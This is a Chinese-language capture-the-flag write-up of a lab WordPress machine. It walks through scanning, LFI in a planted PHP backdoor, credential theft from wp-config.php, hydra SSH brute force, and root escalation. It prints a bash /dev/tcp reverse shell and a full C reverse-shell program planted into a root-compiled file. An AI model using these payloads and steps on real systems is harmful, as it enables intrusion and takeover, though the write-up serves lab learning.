#### 信息收集

1. 主机发现：nmap -sn -PE -n 192.168.1.0/24
   192.168.1.250是新增加的IP，是靶机
2. 端口扫描：nmap -sT --min-rate 10000 -p- 192.168.1.250
   PORT   STATE SERVICE
   22/tcp open  ssh
   80/tcp open  http
3. 获取详细服务信息及操作系统版本：nmap -sT -sV -O -A -p22,80 192.168.1.250
   PORT   STATE SERVICE VERSION
   22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
   | ssh-hostkey:
   |   3072 8d5365835252c4127249be335dd1e71c (RSA)
   |   256 06610a49864364cab00c0f09177b33ba (ECDSA)
   |_  256 9b8d90472ac1dc11287d57e08a23b469 (ED25519)
   80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
   |_http-title: Hacked By Red &#8211; Your site has been Hacked! You\xE2\x80\x99ll neve...
   | http-robots.txt: 1 disallowed entry
   |_/wp-admin/
   |_http-generator: WordPress 5.8.1
   |_http-server-header: Apache/2.4.41 (Ubuntu)
4. 漏洞扫描：nmap --script=vuln -p22,80 192.168.1.250
   有Dos，xss，csrf等漏洞，并没有有价值的漏洞

#### Web渗透

1. 查看80端口，页面是红队已攻破了蓝队，并且已经留下了后门，是wordpress的内容管理系统，开启目录爆破
   `gobuster dir -u http://192.168.1.250 -w /usr/share`
2. 爆破出许多目录，但总是重定向到 `http://redrocks.win/`，并且默认页面的许多超链接也重定向到此域名，将该域名在DNS配置文件中添加
   `192.168.1.250    redrocks.win`
3. 继续访问其他页面，没有什么思路了，看别人的复现，使用CommonBackdoors-PHP.fuzz.txt字典扫描，
   `Progress: 413 / 423 (97.64%)[ERROR] 2023/04/17 08:28:36 [!] Get "http://192.168.1.250/NetworkFileManagerPHP.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)`超时，访问，页面存在，但是空白，搜索得知这个文件有本地文件包含漏洞的可能
4. 启用ffuf模糊测试，`ffuf -c -w /usr/share/wordlists/ -u 'http://redrocks.win/NetworkFileManagerPHP.php?FUZZ=../../../../../../etc/passwd`，关键字为 `key`
   `之前开起了太多目录爆破，导致靶机内存爆了，杀死了一堆服务进程，测试总是超时，重启一下虚拟机就没问题了`
5. php伪协议读取后门文件内容，利用base64读取，解码后得到：

   ```php

   <?php
      $file = $_GET['key'];
      if(isset($file))
      {
          include("$file");
      }
      else
      {
          include("NetworkFileManagerPHP.php");
      }
      /* VGhhdCBwYXNzd29yZCBhbG9uZSB3b24ndCBoZWxwIHlvdSEgSGFzaGNhdCBzYXlzIHJ1bGVzIGFyZSBydWxlcw== */
   ?
   ```

   将注释解码，`That password alone won't help you! Hashcat says rules are rules`，搜了一下，`hashcat`是一款hash破解工具
6. 搜索得知wordpress配置文件为wp-config.php，读取此配置文件

   ```php
   /** MySQL database username */
   define( 'DB_USER', 'john' );

   /** MySQL database password */
   define( 'DB_PASSWORD', 'R3v_m4lwh3r3_k1nG!!' ); 
   ```
7. 利用hashcat破解用户登陆密码，将读取到的密码保存为pass.txt，`rules`字典就是规则，意思就是使用rules字典
   `hashcat --stdout pass.txt -r /usr/share/hashcat/rules/best64.rule > passlist.txt`
8. hydra破解：`hydra -l john -P passlist.txt ssh://192.168.1.250`
   `[22][ssh] host: 192.168.1.250   login: john   password: R3v_m4lwh3r3_k1nG!!02`

   成功破解，ssh登录获取用户初级权限

#### 提权

1. 查看当前用户的sudo权限，sudo -l，`(ippsec) NOPASSWD: /usr/bin/time`，可以以ippsec的身份执行time命令，GTFOBins上搜time，payload：`sudo -u ippsec /usr/bin/time /bin/bash`，切换到ippsec用户，查看家目录下的flag，内容为：`Fake Flag: Come on now Blue! You really think it would be that easy to get the user flag? You are not even on the right user! Hahaha`，说明我们还需切换到加目录下的另一个用户，oxdf用户，并且cat命令被替换成vi命令，很可疑
2. 操作时每隔五分钟会自动退出登录，参考别人的博客，使用以下命令：

   ```
   1. 在 /dev/shm 目录中创建一个反向 shell bash 脚本
      #!/bin/bash
      bash -c 'bash -i >& /dev/tcp/192.168.1.56/1234 0>&1'
   2. 在 kali 上运行 `nc -lvvp 1234` 和 执行 shell 脚本
   3. `python3 -c 'import pty;pty.spawn("/bin/bash")'`
   4. `export TERM=xterm` 然后 Ctrl+Z 退出来一下
   5. `stty raw -echo;fg` 回车后输入 reset 再回车
   ```

   虽然消息还在弹出，但不会退出了，但不知道为什么连接断开后每行的命令提示符前都会多一段缩进，再次反弹shell，没分色了
3. 下载pspy64s脚本 `wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s`，收集真在运行的进程，发现可以利用的后门进程：

   ```
   /bin/sh -c /usr/bin/bash /root/defense/backdoor.sh 
   /usr/bin/gcc /var/www/wordpress/.git/supersecretfileuc.c -o /var/www/wordpress/.git/rev 
   ```

   root文件夹下的文件无法查看，查看supersecretfileuc.c文件

   ```c
   #include <stdio.h>

   int main()
   {

       // prints hello world
       printf("Get out of here Blue!\n");

       return 0;
   }
   ```

   是定时弹出文件的一个，且它具有root权限，删除这两个文件，再上传 `supersecretfileuc.c`文件，c语言的反弹shell，编译成rev，过一段时间他以root自动运行，就可以获得root权限的shell
4. c语言反弹shell：

   ```c
   #include <stdio.h>
   #include <unistd.h>
   #include <sys/types.h>
   #include <sys/socket.h>
   #include <arpa/inet.h>
   #include <signal.h>
   #include <dirent.h>
   #include <sys/stat.h>

   int tcp_port = 8888;
   char *ip = "192.168.1.56";
   void rev_shell(){
           int fd;
           if ( fork() <= 0){
                   struct sockaddr_in addr;
                   addr.sin_family = AF_INET;
                   addr.sin_port = htons(tcp_port);
                   addr.sin_addr.s_addr = inet_addr(ip);

                   fd = socket(AF_INET, SOCK_STREAM, 0);
                   if ( connect(fd, (struct sockaddr*)&addr, sizeof(addr)) ){
                           exit(0);
                   }

                   dup2(fd, 0);
                   //dup2(fd, 1);
                   //dup2(fd, 2);
                   execve("/bin/bash", 0LL, 0LL);
           }
           return;
   }

   void main(int argc, char const *argv[])
   {
           rev_shell();
           return 0;
   }
   ```

   kali开启http服务，靶机wget将两个文件下载 `wget http://192.168.1.56:8000/supersecretfileuc.c`，在本地8888端口开启监听，一段时间后收到root的shell
